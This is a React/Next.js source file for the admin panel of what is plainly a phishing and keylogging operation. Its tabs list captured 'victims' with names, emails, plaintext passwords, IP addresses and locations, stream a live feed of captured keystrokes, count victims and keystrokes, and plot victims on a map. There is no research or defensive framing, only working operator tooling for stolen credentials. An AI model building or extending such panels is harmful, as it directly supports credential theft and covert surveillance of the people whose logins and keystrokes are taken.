'use client';

import { useEffect, useState, useCallback, useRef } from 'react';
import { useRouter } from 'next/navigation';

interface Stats {
  total_victims: number;
  today_count: number;
  unique_ips: number;
  total_keystrokes: number;
  last_capture: string;
}

interface Cred {
  id: number;
  name: string;
  email: string;
  password: string;
  ip: string;
  country: string;
  city: string;
  created_at: string;
}

interface KeylogEntry {
  id: number;
  email_identifier: string;
  key_data: string;
  field_context: string;
  created_at: string;
  keys_display: Record<string, string>;
}

interface Location {
  country: string;
  city: string;
  latitude: number;
  longitude: number;
}

type Tab = 'dashboard' | 'victims' | 'keylog' | 'map';

export default function AdminDashboard() {
  const router = useRouter();
  const [activeTab, setActiveTab] = useState<Tab>('dashboard');
  const [stats, setStats] = useState<Stats | null>(null);
  const [creds, setCreds] = useState<Cred[]>([]);
  const [keylogs, setKeylogs] = useState<KeylogEntry[]>([]);
  const [locations, setLocations] = useState<Location[]>([]);
  const [search, setSearch] = useState('');
  const [page, setPage] = useState(1);
  const [totalPages, setTotalPages] = useState(1);
  const [total, setTotal] = useState(0);
  const [lastKeylogId, setLastKeylogId] = useState(0);
  const [authed, setAuthed] = useState<boolean | null>(null);
  const mapRef = useRef<HTMLDivElement>(null);
  const mapInstance = useRef<any>(null);

  useEffect(() => {
    fetch('/api/admin/stats').then(r => {
      if (r.status === 401) { router.push('/admin/login'); return; }
      return r.json();
    }).then(d => {
      if (d?.status === 'ok') {
        setAuthed(true);
        setStats(d.stats);
        setLocations(d.locations || []);
      }
    });
  }, [router]);

  const fetchCreds = useCallback(async (s?: string, p?: number) => {
    const params = new URLSearchParams();
    if (s || search) params.set('search', s || search);
    if (p || page) params.set('page', String(p || page));
    const res = await fetch(`/api/admin/creds?${params}`);
    if (res.status === 401) { router.push('/admin/login'); return; }
    const d = await res.json();
    if (d.status === 'ok') {
      setCreds(d.data);
      setTotalPages(d.totalPages);
      setTotal(d.total);
    }
  }, [search, page, router]);

  useEffect(() => {
    if (authed && activeTab === 'victims') fetchCreds();
  }, [authed, activeTab, fetchCreds]);

  useEffect(() => {
    if (!authed || activeTab !== 'keylog') return;
    const interval = setInterval(async () => {
      const res = await fetch(`/api/admin/keylog?since=${lastKeylogId}`);
      if (res.status === 401) { router.push('/admin/login'); return; }
      const d = await res.json();
      if (d.status === 'ok' && d.data.length > 0) {
        setKeylogs(prev => [...d.data, ...prev].slice(0, 100));
        if (d.max_id > lastKeylogId) setLastKeylogId(d.max_id);
      }
    }, 3000);
    return () => clearInterval(interval);
  }, [authed, activeTab, lastKeylogId, router]);

  useEffect(() => {
    if (authed) {
      const interval = setInterval(async () => {
        const res = await fetch('/api/admin/stats');
        if (res.status === 401) { router.push('/admin/login'); return; }
        const d = await res.json();
        if (d.status === 'ok') setStats(d.stats);
      }, 10000);
      return () => clearInterval(interval);
    }
  }, [authed, router]);

  useEffect(() => {
    if (!authed || activeTab !== 'map' || !locations.length || !mapRef.current || mapInstance.current) return;

    const L = (window as any).L;
    if (!L) {
      const script = document.createElement('script');
      script.src = 'https://unpkg.com/leaflet@1.9.4/dist/leaflet.js';
      script.onload = initMap;
      document.head.appendChild(script);
      const link = document.createElement('link');
      link.rel = 'stylesheet';
      link.href = 'https://unpkg.com/leaflet@1.9.4/dist/leaflet.css';
      document.head.appendChild(link);
    } else {
      initMap();
    }

    function initMap() {
      const L2 = (window as any).L;
      if (!L2 || !mapRef.current) return;
      mapInstance.current = L2.map(mapRef.current).setView([20, 0], 2);
      L2.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        attribution: '&copy; OpenStreetMap contributors',
        maxZoom: 18,
      }).addTo(mapInstance.current);
      locations.forEach(l => {
        L2.marker([l.latitude, l.longitude]).addTo(mapInstance.current)
          .bindPopup((l.city || '') + (l.country ? ', ' + l.country : ''));
      });
    }
  }, [authed, activeTab, locations]);

  async function deleteCred(id: number) {
    if (!confirm('Delete this entry?')) return;
    await fetch(`/api/admin/creds?id=${id}`, { method: 'DELETE' });
    fetchCreds();
  }

  async function clearAll() {
    if (!confirm('Delete ALL victims?')) return;
    await fetch('/api/admin/creds?all=true', { method: 'DELETE' });
    fetchCreds();
  }

  if (authed === null) return null;

  const tabs: { key: Tab; label: string }[] = [
    { key: 'dashboard', label: 'Dashboard' },
    { key: 'victims', label: 'Victims' },
    { key: 'keylog', label: 'Keylog Feed' },
    { key: 'map', label: 'Map' },
  ];

  const statCards = stats ? [
    { value: stats.total_victims, label: 'Total Victims' },
    { value: stats.today_count, label: 'Today' },
    { value: stats.unique_ips, label: 'Unique IPs' },
    { value: stats.total_keystrokes, label: 'Keystrokes Captured' },
    { value: stats.last_capture, label: 'Last Capture' },
  ] : [];

  const esc = (s: string) => {
    if (typeof document === 'undefined') return s;
    const d = document.createElement('div');
    d.textContent = s;
    return d.innerHTML;
  };

  return (
    <div style={{ display: 'flex', minHeight: '100vh', background: '#111', color: '#e8eaed', fontFamily: '-apple-system, BlinkMacSystemFont, Segoe UI, Roboto, sans-serif' }}>
      <aside style={{ width: 220, background: '#161616', borderRight: '1px solid #222', display: 'flex', flexDirection: 'column' }}>
        <div style={{ padding: '20px 16px', display: 'flex', alignItems: 'center', gap: 10, borderBottom: '1px solid #222' }}>
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#1a73e8" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <rect x="3" y="11" width="18" height="11" rx="2" ry="2" /><path d="M7 11V7a5 5 0 0110 0v4" />
          </svg>
          <span style={{ fontWeight: 500 }}>Admin</span>
        </div>
        <nav style={{ flex: 1, padding: 8 }}>
          {tabs.map(t => (
            <button key={t.key} onClick={() => setActiveTab(t.key)} style={{
              display: 'block', width: '100%', padding: '10px 12px', borderRadius: 8, border: 'none',
              background: activeTab === t.key ? '#1a73e8' : 'transparent', color: '#e8eaed',
              fontSize: 14, cursor: 'pointer', textAlign: 'left', marginBottom: 2,
            }}>{t.label}</button>
          ))}
        </nav>
        <div style={{ padding: 12, borderTop: '1px solid #222' }}>
          <a href="/api/admin/logout" style={{ color: '#9aa0a6', fontSize: 13, textDecoration: 'none' }}>Logout</a>
        </div>
      </aside>

      <main style={{ flex: 1, padding: 24, overflow: 'auto' }}>
        <header style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 24 }}>
          <h2 style={{ fontSize: 22, fontWeight: 500, margin: 0 }}>
            {tabs.find(t => t.key === activeTab)?.label}
          </h2>
          <button onClick={() => window.location.reload()} style={{
            padding: '6px 16px', borderRadius: 8, border: '1px solid #333',
            background: 'transparent', color: '#9aa0a6', fontSize: 13, cursor: 'pointer',
          }}>Refresh</button>
        </header>

        {activeTab === 'dashboard' && (
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(180px, 1fr))', gap: 16 }}>
            {statCards.map((s, i) => (
              <div key={i} style={{ background: '#1a1a1a', borderRadius: 12, padding: 24, textAlign: 'center' }}>
                <div style={{ fontSize: 32, fontWeight: 600, color: '#e8eaed', marginBottom: 4 }}>{s.value}</div>
                <div style={{ fontSize: 13, color: '#9aa0a6' }}>{s.label}</div>
              </div>
            ))}
          </div>
        )}

        {activeTab === 'victims' && (
          <div>
            <div style={{ display: 'flex', gap: 8, marginBottom: 16, alignItems: 'center' }}>
              <input
                value={search}
                onChange={e => setSearch(e.target.value)}
                onKeyDown={e => e.key === 'Enter' && fetchCreds(e.currentTarget.value, 1)}
                placeholder="Search by name, email, IP, country..."
                style={{
                  flex: 1, height: 40, borderRadius: 8, border: '1px solid #333', background: '#1a1a1a',
                  color: '#e8eaed', padding: '0 12px', fontSize: 13, outline: 'none',
                }}
              />
              <button onClick={() => fetchCreds(search, 1)} style={{
                height: 40, padding: '0 16px', borderRadius: 8, border: 'none',
                background: '#1a73e8', color: '#fff', fontSize: 13, cursor: 'pointer',
              }}>Search</button>
              {search && (
                <button onClick={() => { setSearch(''); fetchCreds('', 1); }} style={{
                  height: 40, padding: '0 16px', borderRadius: 8, border: '1px solid #333',
                  background: 'transparent', color: '#9aa0a6', fontSize: 13, cursor: 'pointer',
                }}>Clear</button>
              )}
              <button onClick={clearAll} style={{
                height: 40, padding: '0 16px', borderRadius: 8, border: 'none',
                background: '#c5221f', color: '#fff', fontSize: 13, cursor: 'pointer',
              }}>Clear All</button>
            </div>

            <div style={{ overflowX: 'auto', borderRadius: 12, border: '1px solid #222' }}>
              <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: 13, minWidth: 800 }}>
                <thead>
                  <tr style={{ background: '#1a1a1a' }}>
                    {['ID','Name','Email','Password','IP','Location','Date','Actions'].map(h => (
                      <th key={h} style={{ padding: '10px 12px', textAlign: 'left', color: '#9aa0a6', fontWeight: 500, borderBottom: '1px solid #222' }}>{h}</th>
                    ))}
                  </tr>
                </thead>
                <tbody>
                  {creds.length === 0 ? (
                    <tr><td colSpan={8} style={{ padding: 32, textAlign: 'center', color: '#9aa0a6' }}>No victims captured yet.</td></tr>
                  ) : creds.map(c => (
                    <tr key={c.id} style={{ borderBottom: '1px solid #1a1a1a' }}>
                      <td style={{ padding: '10px 12px' }}>{c.id}</td>
                      <td style={{ padding: '10px 12px' }}>{esc(c.name)}</td>
                      <td style={{ padding: '10px 12px' }}>{esc(c.email)}</td>
                      <td style={{ padding: '10px 12px' }}><code style={{ background: '#222', padding: '2px 6px', borderRadius: 4, fontSize: 12 }}>{esc(c.password)}</code></td>
                      <td style={{ padding: '10px 12px' }}>{c.ip}</td>
                      <td style={{ padding: '10px 12px' }}>{c.country}{c.city ? ', ' + c.city : ''}</td>
                      <td style={{ padding: '10px 12px', whiteSpace: 'nowrap', color: '#9aa0a6' }}>{c.created_at}</td>
                      <td style={{ padding: '10px 12px' }}>
                        <button onClick={() => deleteCred(c.id)} style={{
                          padding: '4px 10px', borderRadius: 6, border: 'none',
                          background: '#c5221f', color: '#fff', fontSize: 11, cursor: 'pointer',
                        }}>Delete</button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>

            {totalPages > 1 && (
              <div style={{ display: 'flex', justifyContent: 'center', gap: 6, marginTop: 16 }}>
                {Array.from({ length: totalPages }, (_, i) => i + 1).map(p => (
                  <button key={p} onClick={() => { setPage(p); fetchCreds(search, p); }} style={{
                    width: 32, height: 32, borderRadius: 8, border: 'none',
                    background: p === page ? '#1a73e8' : '#1a1a1a', color: '#e8eaed',
                    fontSize: 13, cursor: 'pointer',
                  }}>{p}</button>
                ))}
              </div>
            )}
          </div>
        )}

        {activeTab === 'keylog' && (
          <div>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 16 }}>
              <span style={{ fontSize: 13, color: '#34a853' }}>● Live</span>
              <button onClick={() => setKeylogs([])} style={{
                padding: '6px 12px', borderRadius: 8, border: '1px solid #333',
                background: 'transparent', color: '#9aa0a6', fontSize: 12, cursor: 'pointer',
              }}>Clear Feed</button>
            </div>
            <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
              {keylogs.length === 0 ? (
                <div style={{ textAlign: 'center', color: '#9aa0a6', padding: 32, fontSize: 13 }}>Waiting for keystrokes...</div>
              ) : keylogs.map(k => (
                <div key={k.id} style={{ background: '#1a1a1a', borderRadius: 10, padding: 12 }}>
                  <div style={{ display: 'flex', gap: 12, fontSize: 12, color: '#9aa0a6', marginBottom: 6 }}>
                    <span>{esc(k.email_identifier || 'anonymous')}</span>
                    <span>{k.field_context}</span>
                    <span>{k.created_at}</span>
                  </div>
                  <div style={{ fontSize: 13, display: 'flex', gap: 8, flexWrap: 'wrap' }}>
                    {Object.entries(k.keys_display || {}).map(([ctx, val]) => (
                      <span key={ctx}><span style={{ color: '#9aa0a6' }}>{ctx}:</span> <span style={{ color: '#e8eaed' }}>{esc(val || '')}</span></span>
                    ))}
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}

        {activeTab === 'map' && (
          <div ref={mapRef} style={{ height: 500, borderRadius: 12, marginTop: 4 }} />
        )}
      </main>
    </div>
  );
}
